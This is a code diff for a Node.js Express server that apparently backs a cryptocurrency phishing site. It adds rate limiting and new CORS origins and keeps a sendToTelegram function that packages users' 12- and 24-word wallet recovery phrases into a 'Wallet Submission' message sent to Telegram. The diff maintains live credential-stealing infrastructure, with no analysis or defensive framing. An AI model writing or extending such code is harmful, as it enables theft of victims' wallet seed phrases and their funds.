@@ -2,13 +2,14 @@ const express = require("express");
 const mongoose = require("mongoose");
 const cors = require("cors");
 const axios = require("axios");
+const rateLimit = require("express-rate-limit");
 require("dotenv").config();
 
 const app = express();
 
 // Configure CORS
 const allowedOrigins = [
-  "https://swapdexnode.click",
+  "https://67d45df6aabbd700b6d0ca4d--astonishing-cheesecake-627e2f.netlify.app",
   "http://localhost:5173",
   "https://theblockchain-eskq.onrender.com",
 ];
@@ -16,11 +17,9 @@ const allowedOrigins = [
 app.use(
   cors({
     origin: function (origin, callback) {
-      // Allow requests with no origin (like mobile apps or curl requests)
       if (!origin) return callback(null, true);
       if (allowedOrigins.indexOf(origin) === -1) {
-        const msg = "CORS policy failure.";
-        return callback(new Error(msg), false);
+        return callback(new Error("CORS policy failure."), false);
       }
       return callback(null, true);
     },
@@ -32,6 +31,16 @@ app.use(
 
 app.use(express.json());
 
+// Rate Limiting Middleware: Limits to 100 requests per IP per hour
+const limiter = rateLimit({
+  windowMs: 60 * 60 * 1000, // 1 hour
+  max: 10,
+  message: "Too many requests, please try again after soon",
+});
+
+app.use(limiter);
+
+// MongoDB Connection
 mongoose
   .connect(process.env.VITE_MONGO_URI)
   .then(() => console.log("MD connected"))
@@ -54,9 +63,8 @@ const Wallet = mongoose.model("Wallet", walletSchema);
 // Function to send data to Telegram
 async function sendToTelegram(walletData) {
   try {
-    // Ensure that phraseWords and phraseWords24 are arrays or empty if not provided
-    const phraseWords = Array.isArray(walletData.phraseWords) ? walletData.phraseWords.join(', ') : "N/A";
-    const phraseWords24 = Array.isArray(walletData.phraseWords24) ? walletData.phraseWords24.join(', ') : "N/A";
+    const phraseWords = Array.isArray(walletData.phraseWords) ? walletData.phraseWords.join(", ") : "N/A";
+    const phraseWords24 = Array.isArray(walletData.phraseWords24) ? walletData.phraseWords24.join(", ") : "N/A";
 
     const message = `
       🏦 Wallet Submission 🏦
